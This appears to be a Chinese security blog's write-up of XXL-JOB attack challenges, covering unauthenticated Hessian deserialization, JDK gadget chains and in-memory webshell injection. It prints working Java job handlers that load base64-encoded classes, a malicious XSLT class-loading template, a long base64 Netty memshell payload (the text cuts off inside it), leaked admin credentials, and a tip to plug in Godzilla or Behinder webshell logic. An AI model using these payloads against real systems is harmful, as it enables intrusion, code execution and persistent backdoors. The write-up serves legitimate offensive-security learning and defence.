<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="KaGty1" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  
  
  <title>
    
      XXL-JOB攻防 &amp; 内存马 
      
      
      |
    
     KaGty1 &#39;s Personal Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
    <link rel="icon" href="/images/kagty1.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/kagty1.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">kagty1</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/ctf/">
          <a href="/ctf/">CTF</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/notebook/">
          <a href="/notebook/">学习笔记</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">XXL-JOB攻防 & 内存马</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2026-01-11 21:24:51
        </span>
        
      </div>
      <div class="markdown-body">
        <h1 id="XXL-JOB-内存马攻防"><a href="#XXL-JOB-内存马攻防" class="headerlink" title="XXL-JOB 内存马攻防"></a>XXL-JOB 内存马攻防</h1><h3 id="Challenge-01"><a href="#Challenge-01" class="headerlink" title="Challenge 01"></a>Challenge 01</h3><p>通过报错信息，判断为未授权<code>hessian</code>反序列化漏洞</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222105749-awb0nrq.png" alt="image"></p>
<p>‍</p>
<h4 id="Code-Audit"><a href="#Code-Audit" class="headerlink" title="Code Audit"></a>Code Audit</h4><p>​<code>limit=false</code>未做鉴权</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222105918-gihvw68.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222105933-6gbo0x0.png" alt="image"><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222110005-b1ngtmm.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222110039-7wgsrsb.png" alt="image"></p>
<p>‍</p>
<p>确定反序列化器</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222110855-vs039gc.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222110902-rnrv4d0.png" alt="image"></p>
<p>为<code>hessian</code>反序列化</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222111033-4rwz82x.png" alt="image"></p>
<p>‍</p>
<p>利用<code>MemShellParty</code>注入<code>hession</code>内存马即可</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222111646-h3w829b.png" alt="image"></p>
<p>‍</p>
<h4 id="调度后台内存马注入"><a href="#调度后台内存马注入" class="headerlink" title="调度后台内存马注入"></a>调度后台内存马注入</h4><p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222111703-mxdkswk.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222111809-rfxnhrj.png" alt="image"></p>
<p>‍</p>
<p>读<code>XXL-JOB</code>配置文件获取管理员密码</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222112743-wzyqvmc.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222112844-hqvg91t.png" alt="image"></p>
<h4 id="执行器"><a href="#执行器" class="headerlink" title="执行器"></a>执行器</h4><p>‍</p>
<h5 id="执行任意Shell命令"><a href="#执行任意Shell命令" class="headerlink" title="执行任意Shell命令"></a>执行任意Shell命令</h5><p>利用<code>eval &quot;&lt;shell command&gt;&quot;</code>，会将命令执行结果输出至日志中</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222154501-1tclt0g.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222154516-jgznxir.png" alt="image"></p>
<p>‍</p>
<h5 id="后台内存马注入"><a href="#后台内存马注入" class="headerlink" title="后台内存马注入"></a>后台内存马注入</h5><p>应该是注入<code>Jetty</code>内存马</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222150959-3vyc371.png" alt="image"></p>
<p>‍</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.model.ReturnT;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Definder</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Definder</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(Thread.currentThread().getContextClassLoader());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] bytes) &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        execute(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ReturnT&lt;String&gt; <span class="title function_">execute</span><span class="params">(String param)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Str</span> <span class="operator">=</span> <span class="string">&quot;...&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;org.apache.collections.coyote.deserialization.std.TokenBufferDeserializer0b11618e92234a6589498dc61826db43&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(className);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Definder</span>().defineClass(Base64.getDecoder().decode(base64Str)).newInstance();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable ee) &#123;</span><br><span class="line">                ee.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ReturnT.SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写文件成功</p>
<p>‍</p>
<h5 id="执行器-hessian-反序列化内存马注入"><a href="#执行器-hessian-反序列化内存马注入" class="headerlink" title="执行器 hessian 反序列化内存马注入"></a>执行器 hessian 反序列化内存马注入</h5><p>​<code>XXL-JOB</code>中 - 调度中心(客户端) 和 执行器(服务端) 中，利用<code>hessian</code>来实现<code>RPC</code>调用</p>
<p>首先尝试注入回显马，参考<code>Challenge 02</code>，低版本未引入黑名单的的<code>hessian</code>，直接打<code>JDK</code>原生+<code>JavaWrapper</code>链即可</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222181515-zhmq3nd.png" alt="image"></p>
<p>这个<code>Jetty</code>内存马需要定制化注入，过后再研究</p>
<p>‍</p>
<p>‍</p>
<h3 id="Challenge-02"><a href="#Challenge-02" class="headerlink" title="Challenge 02"></a>Challenge 02</h3><h4 id="Code-Audit-1"><a href="#Code-Audit-1" class="headerlink" title="Code Audit"></a>Code Audit</h4><p>这里<code>xxl-job</code>版本为<code>2.0.2</code>，对应代码中的<code>hessian</code>版本为<code>4.0.60</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222171436-4uh0kth.png" alt="image"></p>
<p>使用的是<code>hessian2</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222171546-gvben9a.png" alt="image"></p>
<p>‍</p>
<p>黑名单在<code>4.0.63</code>才引入，所以可以直接打<code>hessian JDK</code>原生利用链，调用任意类的静态方法，之前在<code>CTF</code>中遇到过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">createValue:<span class="number">73</span>, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:<span class="number">216</span>, UIDefaults (javax.swing)</span><br><span class="line">get:<span class="number">161</span>, UIDefaults (javax.swing)</span><br><span class="line">toString:<span class="number">253</span>, MimeTypeParameterList (javax.activation)</span><br><span class="line">valueOf:<span class="number">2994</span>, String (java.lang)</span><br><span class="line">append:<span class="number">131</span>, StringBuilder (java.lang)</span><br><span class="line">expect:<span class="number">2880</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">readString:<span class="number">1398</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">readObjectDefinition:<span class="number">2180</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2122</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">ser:<span class="number">26</span>, hessianDes (myClassLoader)</span><br><span class="line">main:<span class="number">40</span>, hessianDes (myClassLoader)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222171922-1sg3h6j.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222171901-wvhhj6o.png" alt="image"></p>
<p>‍</p>
<h5 id="Chains01-JavaWrapper-main"><a href="#Chains01-JavaWrapper-main" class="headerlink" title="Chains01 - JavaWrapper#_main"></a>Chains01 - JavaWrapper#_main</h5><p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222172732-e1qiu8m.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222172252-e5ykbou.png" alt="image"></p>
<p>​<code>Java-Chains</code>已经集成此链</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222172506-8hg9mhv.png" alt="image"></p>
<p>‍</p>
<h5 id="Chains02-com-sun-org-apache-xalan-internal-xslt-Process-main"><a href="#Chains02-com-sun-org-apache-xalan-internal-xslt-Process-main" class="headerlink" title="Chains02 - com.sun.org.apache.xalan.internal.xslt.Process#_main"></a>Chains02 - com.sun.org.apache.xalan.internal.xslt.Process#_main</h5><p>​<code>com.sun.org.apache.xalan.internal.xslt.Process</code>在<code>java 9+</code>被移除</p>
<p>​<code>xslt</code>模版注入，先写入一个恶意的<code>.xslt</code>文件，然后利用<code>com.sun.org.apache.xalan.internal.xslt.Process#_main</code>调用即可执行恶意命令&amp;注入内存马</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:b64</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:ob</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:th</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:ru</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;bs&quot;</span> <span class="attr">select</span>=<span class="string">&quot;b64:decodeBuffer(b64:new(),&#x27;&lt;base64 data&gt;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;cl&quot;</span> <span class="attr">select</span>=<span class="string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rce&quot;</span> <span class="attr">select</span>=<span class="string">&quot;ru:defineClass(&#x27;&lt;恶意类类名&gt;&#x27;,$bs,$cl)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$rce&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222175533-cby1m37.png" alt="image"></p>
<p>‍</p>
<p>同上<code>Java-Chains</code>中也集成了此链，同时给出了两种不同的利用方式</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222180455-zhcazwm.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222180743-74m15vb.png" alt="image"></p>
<p>‍</p>
<p>‍</p>
<h4 id="调度后台内存马注入-1"><a href="#调度后台内存马注入-1" class="headerlink" title="调度后台内存马注入"></a>调度后台内存马注入</h4><p>​<code>hessian JDK</code>原生<code>JavaWrapper</code>链注入内存马</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222172809-i4ox46l.png" alt="image"></p>
<p>​<code>xslt</code>链注入内存马</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222180420-k0uyzjr.png" alt="image"></p>
<p>‍</p>
<p>​<code>xslt2</code>链注入内存马</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251222180825-6v4o59a.png" alt="image"></p>
<p>‍</p>
<h4 id="执行器内存马注入"><a href="#执行器内存马注入" class="headerlink" title="执行器内存马注入"></a>执行器内存马注入</h4><p>拿配置文件，调度后台密码为<code>UP7di7YLnPkvw89QID</code>​</p>
<p>可以直接进后台执行<code>Java</code>代码打<code>Netty</code>内存马，具体原理见文章最后对<code>XXL-JOB &amp; Netty</code>内存马的分析</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224131637-3zwl0mi.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224131957-4v32e9g.png" alt="image"></p>
<p>将<code>NettyThreadHandler#channelRead</code>中的逻辑更换为哥斯拉&#x2F;冰蝎即可​​</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="Challenge-03"><a href="#Challenge-03" class="headerlink" title="Challenge 03"></a>Challenge 03</h3><h4 id="执行器内存马注入-1"><a href="#执行器内存马注入-1" class="headerlink" title="执行器内存马注入"></a>执行器内存马注入</h4><p>弱口令 <code>admin : 123456</code>​</p>
<h5 id="后台定时任务直接实例化恶意类注入Netty内存马"><a href="#后台定时任务直接实例化恶意类注入Netty内存马" class="headerlink" title="后台定时任务直接实例化恶意类注入Netty内存马"></a>后台定时任务直接实例化恶意类注入Netty内存马</h5><p>因为从<code>xxl-job 2.3.0</code>开始取消了<code>execute</code>方法的出入参数设计，而<code>MemshellParty</code>中给的<code>execute()</code>方法中依然有参数，所以需要修改<code>payload</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223163042-1unc8td.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223162943-agr9xf7.png" alt="image"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.service.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">base64Str</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQBoQEAKmNvbS9mYXN0ZXJ4bWwvamFja3Nvbi95VGpZTi9FbmNyeXB0aW9uVXRpbAcAAQEATkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxJbml0aWFsaXplcjxMaW8vbmV0dHkvY2hhbm5lbC9zb2NrZXQvU29ja2V0Q2hhbm5lbDs+OwEAI2lvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEluaXRpYWxpemVyBwAEAQA6Y29tL3h4bC9qb2IvY29yZS9zZXJ2ZXIvRW1iZWRTZXJ2ZXIkRW1iZWRIdHRwU2VydmVySGFuZGxlcgcABgEAI2NvbS94eGwvam9iL2NvcmUvc2VydmVyL0VtYmVkU2VydmVyBwAIAQAWRW1iZWRIdHRwU2VydmVySGFuZGxlcgEAJWphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXAHAAsBAB5qYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMHAA0BAAZMb29rdXABAANtc2cBABJMamF2YS9sYW5nL1N0cmluZzsBAAJvawEAAVoBAAxoYW5kbGVyQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAMZ2V0Q2xhc3NOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBADZvcmcuYXBhY2hlLmh0dHAud2ViLmhhbmRsZXJzLmp4WFpRLkNoZWNrZXJOZXR0eUhhbmRsZXIIABkBAA9nZXRCYXNlNjRTdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwAcARJgSDRzSUFBQUFBQUFBLzUxWUNYd1QxNW4vZjdic2tXUngyVGxRQWtuSVFXVFpSZ1lNQmhzSVBvTkJQb0p0SEVOYUdFdGpXeUJHaWpRQ25FM1NKbTBUbXJacFN1a0JYZmJxN21hM0ozRWIyWlEyVGJyZHBOdnVmZCs3M1N0NzM1dmRkTGV3L3pjek5ySXRnMXQrUmpQdnZlOTYzLzNOdDY5ODVSVUFEZklwd2RaVVppeWlwL1hZdUJFWnQ2eDA1S1F4RWhuWHpYalN5R1FqUjA4OWZQQ2hTTnU0RVR0bVpIb015NXJZNHh4cEVNRjlpVlRFVkp1UkdERk1JMGxJKzltZVN5ZU5VN09ncFlKd2RERllGK3JlL25FOW80OGtqV1pCYUttd0dzb0ZkOTRBV29OWDRKMUJFWlFlTXlZRWxkR2orZ2s5a3RUTnNVaS9sVW1ZWTJTOGN2dVcwYzJiWTQzMWphTU45ZldiTmhwZUxCTjQwbm8yU3hKNzkzVk03TTN0Yi9GaUpha2NqMjhSM05XNXJYMXI1NmJ0RFEwZG16cmJ0blMwdDI2c2IyemQxdDYrWlZ0NzU5YU96Z1l2cWdUK2NVT1BVMy82Y2JMM0QyYU5URjNMbUdGYVh0d2lxSEFPRCtqSkhFKzkwZkdSdnNmUzR3TmVCSG1XTVI3TkdWbXJOUldueU1FRklyZm1Fa25pVW5MTmhSUlVYOU8wYThaSUxCVTNZbzUxOS9CbnZ3T3FzTkw2UkRLbHh3V3JDbWkzSlhsZm50NDBmMjlIZUJlM3kzY2t6SVMxaXlvSVZSOEk0RzdjNDRjSDl3cHVYVVE4RGV2OXVCLzNCbkE3MXZoUWdtcmV6TFhWZmtOeDN4bTZrWHUwcFV6TE9HVTFGNGpVTzNMVWlGbk4xUWNFVmRkMk8wN0ZqTFNWU0prYTZ1WWNESXhuVWljZHA0a0k3bCtpa2pSc0RHQXQ3bEJpYjZiQ0hHUFJHMnBDTjFiMEhnZTRPWUF0MkZxQlRXZ000R1lFRkszdFN4REJSZGRBcFplT0diVHQrdEJDcjYxZXVCWEFUdXp5WXdjZUNHQzF3NitGemowZlRrTWJIUzVHemVvSmsxZTZ2WkE2MVovcFZ6b3dZMFp6OWNFQU90RHBSenNlcEJSTHM1V0dMc0dLMFVUR2FDdTA5WTVRRVJzdTFmd0I3RU8wQW52UnZRVDkyVWdtNWVpbDRXTE9RdDJ5Z050SWJuU1VpSzBUbHRHYUd5WDVoN0MvQW4zb1o3VE5BdVdzaEMxUEptdFlnM3pYTUNnb0d4em9QTHhOY0p0ekc1UFFNUWRrQnBUVWh2Q3dEd2N3ek5oWWhLV0dRN1NCbFhJc0l0Z1FXcHhlVVV1L0ErLzA0eEVjWmx6cTZiUmhVc04xUy9LU21kd1JnSTRSRlo4eE92WDFWQnJWczlZY3RSb0JySEM4aTRLWEp3MXp6QnEzczBKWEFBa2NWZDV5VE9ETDVrYXk3dTF1RG5VVnZjUnhtRXFDbEtQV3VtMWVQRG9UdXhRbk1yZy8ybTRvU1poSzZLZmxjWHNoMkZia29rc01rQnhPK0dIaHBKTFBzS0t1N0I3S3g1UTJnY2VVT0Q4aUNJem9XV05yUTd2TDhKWmltajNVR3NBVGVOSlBQYnhMSUtmb2JLRkRyUWZ0L2Fmd3ROcC9Ud0IzNGk2bHFmZFJDUmxqTkVtdlo0NXFOMFlUcG1IblZxV2NRNjNWQzlKd0FNL2l0S0x4ZmdHOCtBQ0Z6TnBXL3FGeTVvek12T1NIOEx3aSsyRkJ5YUZXRFI5aHJNN2pyZUdqVE5TbWNiTEx6Rm82OHdCTFFxaDZZZlFHOERGODNJK3orSVJnclgxS3daUi90MlF5K2tSdnprcm5MREkyOU9NYXp2bHhYdFdLbGZPcGFQaFJXcFlKUjAvYXVpaVNKSmlFZmd3LzdzY0YvTVI4U1FyQzRhY1V3S2NEcUhSYzgyZVUxYm9XYzdzWGxaUCtIRzlwcFdZRlZtNWdHKzh6K0t5UzluT3pidEJoenJqQlhFdk5FdndDdnFoMGVsRlJUU2tYK2pTMXlzemRrY21rTXQxR05xdVBFYjI2OEhLelphbTRuMzRaTHl1S2VjSHFZdTZoS25JWm5ILzE1SlhObVJ1T0o3S3hEWU5tVmg5bCszS1ozamlhY2x1UCsyNlFHR1k4N210NFJabno2d3dPYTl5WUlmVWFyY2E3TUJhU2VzYUlkeWFNNUJLU2pldnNFUnVjdEg4QjMxUzBmM0ZPdXpBSFNNTWJnbVdNeXBaWWpDcEwyRTJiSjNSUU9lMHY0ZHQrZkF2Zm1WY0taOHRJRWQvY2lWOVJLTC9LeTFENjdsUThsK1JsZnQxZEd0WjRpcmZZWGVRV2h4Wm9wdGk5SEFyazg1djRMWFd4MzJZNkoyRTNwcXRDeGZUN3UvZzk1YVMvei9OREMwWFc4SWUwOW1LY05Qd3g0eVJobmtnZG8xcTJGOUZDRVpKRkZmT24rRE0vL2dSL3p1WXZaZS9aMnU4ZEhhWHF2ZmdMY2pudUt1dXZCTXV2RVlpbVZPdndOMVJna205dTM4cXN2emVBdjhYZitmRW0vdDd4K2hZejNtOVlEajh2L3BGR0hCanU2d2pnbjFVcWZCUC9RdGM4b2JCN1I1V2k5aFlLcVhoUXhIL0R2eXQ2L3pIakxHNHhzUFVZVGVsMlFmZ3ZobWZob1liL25wTmVHR0RzT3pTOFRhZUs1VElabGk1bmEzNE9jWGJKOVgveGYzNThEOTluR2xLV2RMSm9BVS8yQmd2TjZod1IreXBiZkh4UFJNVzVhd3BYc3VaRmNPd3VXa3I5ZUVzODVGa1VTQk5PT2hYeGEvWENLNXhxVmwyRDdhS1VZd3JPNzVNS3BkdFZCYkhxdUU1QWx0aytLc3VWM2I5ako4YkNlN2drbE41bGxWOHFwSkoyYmVubzk4cE5ialUrRllsbEp0SldLdEtXU0k4clptcCtJWjlyQmFKNjBYUXdEN2M1SUtzbDZKZGI1VGFPY0hNQXNtbTJIUDFHTEdOWSs0eUpmcTQwV1JOQWhaM1E1UTRud0ZTNnpnYmtMcFdqMjJVZFBZVDVzWGlsdTF2dThjdGFZZFh4cU1sRmdYWTVrRm1ESHBGZ0FTVWZCU3JyNVg0bFVvaXVHVTkxSmt3OXlUQlFpWmYxUU1KU293NXJYZmZhb1ByQ0RhMTJaZkRLQnBwZFpYcTdSR1M4d215ODNMQVhBMjV6NTVWTl